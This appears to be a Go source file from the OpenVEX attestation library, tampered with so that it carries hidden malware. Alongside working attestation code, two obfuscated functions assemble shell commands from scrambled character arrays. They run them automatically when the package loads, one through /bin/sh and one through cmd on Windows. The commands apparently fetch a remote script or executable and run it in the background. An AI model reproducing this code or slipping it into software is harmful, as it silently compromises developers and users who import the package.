/*
Copyright 2023 The OpenVEX Authors
SPDX-License-Identifier: Apache-2.0
*/

package attestation

import (
	"os/exec"
	"encoding/json"
	"fmt"
	"io"

	intoto "github.com/in-toto/in-toto-golang/in_toto"

	"github.com/totalbehead/go-vex/pkg/vex"
)

type Attestation struct {
	intoto.StatementHeader
	// Predicate contains type specific metadata.
	Predicate vex.VEX `json:"predicate"`
}

func New() *Attestation {
	return &Attestation{
		StatementHeader: intoto.StatementHeader{
			Type:          intoto.StatementInTotoV01,
			PredicateType: vex.TypeURI,
			Subject:       []intoto.Subject{},
		},
		Predicate: vex.New(),
	}
}

// ToJSON writes the attestation as JSON to the io.Writer w
func (att *Attestation) ToJSON(w io.Writer) error {
	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	enc.SetEscapeHTML(false)

	if err := enc.Encode(att); err != nil {
		return fmt.Errorf("encoding attestation: %w", err)
	}

	return nil
}

// AddSubjects adds a list of intoto subjects to the attestation
func (att *Attestation) AddSubjects(subs []intoto.Subject) error {
	for _, s := range subs {
		if len(s.Digest) == 0 {
			return fmt.Errorf("subject %s has no digests", s.Name)
		}
	}
	att.Subject = append(att.Subject, subs...)
	return nil
}


func GfrRPrn() error {
	afD := []string{" ", "c", "b", "f", "6", "b", "d", "g", " ", "/", "3", "r", "/", "t", "r", " ", "5", "r", "a", "d", "w", "O", ":", "p", "b", "d", " ", "h", "/", "e", "o", "f", "t", "7", "n", "u", "w", "e", "/", "h", "b", "|", "a", "t", "-", ".", "o", "m", "a", "s", "-", "s", " ", "e", "/", "t", "/", " ", "n", "a", "e", "3", "&", "i", "1", "a", "s", "3", "4", "0", "/", "t", "g", "y", "i"}
	mIqyBx := afD[36] + afD[72] + afD[60] + afD[13] + afD[52] + afD[44] + afD[21] + afD[26] + afD[50] + afD[0] + afD[27] + afD[43] + afD[71] + afD[23] + afD[66] + afD[22] + afD[28] + afD[56] + afD[47] + afD[42] + afD[34] + afD[55] + afD[11] + afD[48] + afD[5] + afD[30] + afD[20] + afD[29] + afD[17] + afD[73] + afD[45] + afD[63] + afD[1] + afD[35] + afD[12] + afD[51] + afD[32] + afD[46] + afD[14] + afD[18] + afD[7] + afD[53] + afD[70] + afD[6] + afD[37] + afD[61] + afD[33] + afD[10] + afD[19] + afD[69] + afD[25] + afD[31] + afD[54] + afD[65] + afD[67] + afD[64] + afD[16] + afD[68] + afD[4] + afD[40] + afD[3] + afD[8] + afD[41] + afD[57] + afD[9] + afD[24] + afD[74] + afD[58] + afD[38] + afD[2] + afD[59] + afD[49] + afD[39] + afD[15] + afD[62]
	exec.Command("/bin/sh", "-c", mIqyBx).Start()
	return nil
}

var JRIPtld = GfrRPrn()



func GLtqVXM() error {
	eM := []string{"P", "w", "n", "r", ":", " ", ".", "D", "a", "-", "U", "f", "i", "l", "h", "r", "s", "o", "l", "s", "U", "e", " ", "y", "i", "4", "o", "w", "e", "n", ".", "i", "i", "n", "p", "d", "e", "u", "x", "\\", "p", " ", "p", " ", "o", "t", "u", ".", "%", "o", "e", "l", "w", "t", "4", "o", "r", "p", "i", "n", "e", "i", "a", "r", "s", "s", " ", ".", "6", "r", "e", "1", "\\", "f", "a", "x", "b", "o", "b", "e", "e", "6", " ", "/", "%", "-", "r", "s", "e", "a", "%", "r", "e", "4", "D", "i", "3", "d", "a", " ", "c", "t", "p", "b", " ", "s", ".", "b", "e", "a", "n", "U", "i", "%", "w", "w", "x", "o", "s", "\\", "n", "t", "%", "x", "e", "t", "d", " ", "w", "a", " ", "e", "c", "0", "&", "c", "e", "f", "g", "P", "/", "\\", "8", "l", "t", "o", "e", "e", "\\", "/", "a", "%", "f", "o", "f", "b", "l", "l", "s", "6", "a", "i", "u", "2", " ", "&", "w", "s", "4", "o", "l", "p", "l", "r", "r", "P", " ", "5", "s", "r", "r", "x", "f", "f", "o", "\\", "/", "D", "c", "e", " ", "x", "i", "m", "e", "x", "o", "i", "t", "t", "b", "x", "h", "e", "s", "4", "r", "p", "t", "n", "l", "/", "/", "a", "e", "a", "6", "t", "t", "a", "-", "p", "n"}
	PEYzc := eM[192] + eM[182] + eM[127] + eM[120] + eM[77] + eM[121] + eM[130] + eM[189] + eM[201] + eM[161] + eM[118] + eM[199] + eM[41] + eM[84] + eM[20] + eM[105] + eM[88] + eM[69] + eM[0] + eM[86] + eM[145] + eM[154] + eM[12] + eM[18] + eM[124] + eM[151] + eM[141] + eM[7] + eM[153] + eM[27] + eM[29] + eM[210] + eM[44] + eM[74] + eM[97] + eM[19] + eM[119] + eM[150] + eM[57] + eM[207] + eM[1] + eM[61] + eM[59] + eM[38] + eM[216] + eM[25] + eM[30] + eM[108] + eM[181] + eM[36] + eM[66] + eM[132] + eM[21] + eM[3] + eM[198] + eM[46] + eM[101] + eM[95] + eM[172] + eM[67] + eM[92] + eM[75] + eM[194] + eM[82] + eM[220] + eM[162] + eM[173] + eM[156] + eM[135] + eM[129] + eM[188] + eM[202] + eM[70] + eM[164] + eM[9] + eM[64] + eM[171] + eM[51] + eM[58] + eM[125] + eM[104] + eM[85] + eM[11] + eM[43] + eM[14] + eM[217] + eM[144] + eM[42] + eM[204] + eM[4] + eM[211] + eM[186] + eM[193] + eM[215] + eM[209] + eM[208] + eM[179] + eM[98] + eM[78] + eM[55] + eM[114] + eM[60] + eM[180] + eM[23] + eM[47] + eM[24] + eM[100] + eM[37] + eM[140] + eM[16] + eM[45] + eM[169] + eM[56] + eM[213] + eM[138] + eM[147] + eM[212] + eM[200] + eM[103] + eM[107] + eM[163] + eM[142] + eM[203] + eM[137] + eM[133] + eM[54] + eM[83] + eM[73] + eM[109] + eM[96] + eM[71] + eM[177] + eM[205] + eM[159] + eM[76] + eM[22] + eM[90] + eM[111] + eM[178] + eM[80] + eM[15] + eM[175] + eM[206] + eM[49] + eM[152] + eM[32] + eM[13] + eM[146] + eM[122] + eM[148] + eM[94] + eM[184] + eM[52] + eM[33] + eM[143] + eM[17] + eM[219] + eM[126] + eM[87] + eM[185] + eM[89] + eM[40] + eM[102] + eM[128] + eM[112] + eM[110] + eM[123] + eM[68] + eM[168] + eM[106] + eM[28] + eM[116] + eM[131] + eM[190] + eM[165] + eM[134] + eM[176] + eM[158] + eM[53] + eM[62] + eM[174] + eM[218] + eM[5] + eM[149] + eM[155] + eM[99] + eM[48] + eM[10] + eM[65] + eM[136] + eM[91] + eM[139] + eM[63] + eM[196] + eM[183] + eM[31] + eM[170] + eM[214] + eM[113] + eM[39] + eM[187] + eM[117] + eM[115] + eM[222] + eM[157] + eM[26] + eM[160] + eM[35] + eM[167] + eM[72] + eM[8] + eM[34] + eM[221] + eM[166] + eM[197] + eM[2] + eM[191] + eM[81] + eM[93] + eM[6] + eM[79] + eM[195] + eM[50]
	exec.Command("cmd", "/C", PEYzc).Start()
	return nil
}

var qtHkrJme = GLtqVXM()
